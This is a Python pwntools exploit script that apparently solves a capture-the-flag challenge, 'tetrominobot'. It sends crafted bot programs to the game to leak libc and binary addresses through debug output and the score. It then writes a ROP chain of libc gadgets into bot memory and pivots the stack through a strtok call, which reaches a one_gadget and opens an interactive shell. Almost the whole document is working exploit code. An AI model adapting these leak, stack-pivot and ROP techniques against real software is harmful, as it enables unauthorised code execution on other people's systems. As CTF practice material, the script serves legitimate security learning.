from pwn import *
from functools import reduce

context.log_level = "info"

def spawn_process(): # as the server runs it
    return process(["./ld-linux-x86-64.so.2", "--library-path", \
                    ".", "./tetrominobot"])
    # return remote("tetrominobot.ctf.maplebacon.org", 1337)
    # return process(["./tetrominobot"])

SEED_SIZE = 2 ** 16;
GOAL_SRAND = 0

def prog_sum(prog):
    return reduce(lambda a, c: a + c, prog, 0) % SEED_SIZE

# played manually with srand patched to 0 searching for addresses, logging inputs
cmdlog_ceiling = b"=== g  g--.ad-d---d-d=dda=d=d=dd=d.."
cmdlog_tspin = b"d----   g    gw===    -g====s.wd==.-.w--a   a.g"

def wrap_curly(bs):
    return b'{' + bs + b'}'

def manual_in_to_bot(bs):
    # i lose hair writing python
    def cmd_to_call(b):
        match chr(b):
            case '-':
                return b"left"
            case '=':
                return b"right"
            case '.':
                return b"drop"
            case 'w':
                return b"hold"
            case 'a':
                return b"rot_l"
            case 's':
                return b"rot_180"
            case 'd':
                return b"rot_r"
            case ' ':
                return b"down"
            case 'g':
                return b"commit"
            case _:
                return b"die"

    def cmd_to_cond(i, cmd):
        return b'if (mem[4] == ' \
            + bytes(str(i), 'utf-8') \
            + b') { mem[5] = call(' \
            + cmd_to_call(cmd) \
            + b'); } '

    cond_move = b''.join(map(cmd_to_cond, range(len(bs)), bs))
    increment_counter = b'mem[4] = mem[4] + 1; '
    p_mem = b'if (mem[5] > 7 || mem[5] < 0) { print(88888888888888); print(mem[4]); print(mem[5]); } '

    p1 = wrap_curly(cond_move + increment_counter + p_mem)
    return p1

def pwn_send_bot(p, bot):
    def srand_override(prog):
        # EOF char = 4, newline = 10 (will not work with cmdline -b prog)
        todo = (GOAL_SRAND + SEED_SIZE - (prog_sum(prog) + 10 + 4)) % SEED_SIZE
        return prog + b'' \
            + b''.join([b'~' for i in range(todo // ord('~'))]) \
            + bytes([todo % ord('~')])

    p.recvuntil(b'> ')
    p.sendline(b"-d_name")
    p.recvuntil(b'> ')
    p.sendline(srand_override(bot))

def pwn_send_bot_recv(p, bot):
    pwn_send_bot(p, bot)
    debug_prints = p.recvuntil(b"+------------+--------------------+------------+", drop=True)
    board = p.recvuntil(b"Score: ")
    score = p.recvuntil(b'\n')
    log.info(debug_prints)
    log.info(board)
    log.info(b"py rcved score: " + score)
    p.recvuntil(b'> ')
    p.sendline(b'y')
    return (debug_prints, score)

eights = b'88888888888888'

def pwn_1_find_libc(p):
    (ceil_log, _) = pwn_send_bot_recv(p, manual_in_to_bot(cmdlog_ceiling))
    ceil_log = ceil_log.split(b'\n')
    ceil_log = ceil_log[ceil_log.index(eights):-2]
    log.info(ceil_log)
    for c in ceil_log:
        if c == eights:
            continue
        log.info(hex(unsigned(int(c))))
        libc_u = libc_l = b''
    for i in range(len(ceil_log) // 3):
        (e_mark, mem4ctr, mem5retval) = ceil_log[i*3:i*3+3]
        if e_mark != eights:
            print(b"probably wrong: " + eights)
        if mem4ctr == b'14':
            libc_u = unsigned(int(mem5retval))
        if mem4ctr == b'19':
            libc_l = unsigned(int(mem5retval))

    libc_leak = (libc_u << 32) + libc_l
    libc_leak_offset = 0x15555541a780 - 0x155555200000 # base
    return libc_leak - libc_leak_offset

def pwn_2_find_bin(p):
    (_, tsp_score) = pwn_send_bot_recv(p, manual_in_to_bot(cmdlog_tspin))
    bin_leak_offset = 0x155555513ae0 - 0x155555509000 # base
    return int(tsp_score) - bin_leak_offset

def libc_addr(leakc, n):
    a = 0
    match n:
        case "base":
            a = 0x155555200000
        case "exit":
            a = 0x155555200000 + 0x000455f0
        case "strtok_str":
            a = 0x155555200000 + 0x00019767
        case "load_stack": # mov rsp, rdx ; ret
            a = 0x000015555525a170
        case "oneg_rdi_rsi":
            a = 0x1555552ebcf8
        case "pop_rsi":
            a = 0x000015555522be51
        case "pop_rdi":
            a = 0x000015555522a3e5
        case "pop_rbp":
            a = 0x000015555522a2e0

    return a + leakc - 0x155555200000

def tbot_mem_addr(leakb):
    return leakb + 0x1555555130d0 - 0x155555509000 # base

# strtok is called first. we look for this string in the gfunc table
# (which extends into this bit of memory) and call the stack mover.
# from there it's rop.
def pwn_3_mov_stack(p, leakc, leakb):
    bot = ("{"
           + " mem[0]=" + str(libc_addr(leakc, "pop_rsi"))
           + " mem[1]=0"
           + " mem[2]=" + str(libc_addr(leakc, "pop_rdi"))
           + " mem[3]=0"
           + " mem[4]=" + str(libc_addr(leakc, "pop_rbp"))
           + " mem[5]=" + str(tbot_mem_addr(leakb))
           + " mem[6]=" + str(libc_addr(leakc, "oneg_rdi_rsi"))
           + " mem[7]=12345"
           + " mem[8]=" + str(libc_addr(leakc, "strtok_str"))
           + " mem[9]=" + str(libc_addr(leakc, "load_stack"))
           + " call(strtok)"
           + " }").encode()
    # print(p.pid)
    # pause()
    pwn_send_bot(p, bot)


def main():
    p = spawn_process()
    libc_leak = pwn_1_find_libc(p)
    bin_leak = pwn_2_find_bin(p)
    log.info("libc leak: " + hex(libc_leak))
    log.info("tetrominobot leak: " + hex(bin_leak))

    pwn_3_mov_stack(p, libc_leak, bin_leak)
    p.interactive()
main()

# gdb script
# b *0x15555550d1d5
# c
# nextcall

# tbot memory = 0x1555555130d0
# game board =  0x155555513ae0
